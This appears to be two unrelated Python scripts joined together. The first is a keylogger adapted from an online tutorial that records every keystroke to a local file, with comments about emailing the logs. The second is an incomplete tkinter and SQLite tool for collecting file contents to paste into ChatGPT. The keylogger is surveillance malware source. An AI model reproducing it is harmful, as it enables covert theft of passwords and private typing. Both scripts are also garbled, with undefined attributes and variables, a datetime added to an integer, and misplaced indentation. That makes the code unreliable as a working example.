# Reference: https://thepythoncode.com/article/write-a-keylogger-python

import keyboard # for keylogs
from datetime import datetime

SEND_REPORT_EVERY = 15 # in seconds, 60 means 1 minute and so on

class Keylogger:
    def __init__(self, interval, report_method="file"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.starting = datetime.now()
        self.ending = datetime.now() + SEND_REPORT_EVERY

    def callback(self, event):
        # This callback is invoked whenever a keyboard event is occured
        # (i.e when a key is released in this example)
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name

    def report_to_file(self):
        # This method creates a log file in the current directory that contains
        # the current keylogs in the `self.log` variable
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "a") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def report(self):
            # This function gets called every `self.interval`
            # It basically sends keylogs and resets `self.log` variable
            if self.log:
                # if there is something in log, report it
                self.ending = datetime.now() + SEND_REPORT_EVERY
                # update `self.filename`
                self.update_filename()
                if self.report_method == "file":
                    self.report_to_file()
                # if you don't want to print in the console, comment below line
                print(f"[{self.filename}] - {self.log}")
                self.starting = datetime.now()
            self.log = ""
           # timer = Timer(interval=self.interval, function=self.report)
            # set the thread as daemon (dies when main thread die)
            # timer.daemon = True
            # start the timer
            # timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # make a simple message
        print(f"{datetime.now()} - Started keylogger")
        # block the current thread, wait until CTRL+C is pressed
    keyboard.wait()

if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
keylogger.start()







'''
1. PUT dixie.py ONE STEP ABOVE THE FOLDER(s) WHERE YOU HAVE FILES TO COMPILE.
2. RUN dixie.py.
3. ENTER THE NAMES OF THE FILES YOU WANT TO SEARCH FOR, SEPARATED BY COMMAS (e.g., cont.html, jessie.py, random.js).
4. A TEXT FILE "file_contents.txt" WILL BE GENERATED THAT YOU CAN USE TO CONVERSE IN CODE WITH ChatGPT.
'''

import os
import tkinter as tk
from tkinter import messagebox
import sqlite3

# Connect to the SQLite database file
db_file_path = os.path.join(os.getcwd(), 'file_search.db')
conn = sqlite3.connect(db_file_path)
cursor = conn.cursor()

# Create the table if it doesn't exist
cursor.execute('''CREATE TABLE IF NOT EXISTS search_history
                  (folder_name TEXT, file_names TEXT)''')
conn.commit()





def write_contents_to_file(file_contents):
    """
    Writes the contents of the files to a text file named 'file_contents.txt'.
    Each file's content is preceded by the file name.
    """
    file_path = os.path.join(os.getcwd(), 'file_contents.txt')
    with open(file_path, 'w') as f:
        f.write("***Codebase:")
        for file, content in file_contents.items():
            f.write(f"\n\n**{file}:-\n{content.strip()}")







window = tk.Tk()
window.title("File Search")
window.geometry("600x200")  # Adjusted the window size







# Entry field for file names
entry = tk.Entry(window, width=60)
entry.insert(0, entry_text)
entry.pack(pady=10)



window.mainloop()

# Close the connection to the SQLite database
conn.close()
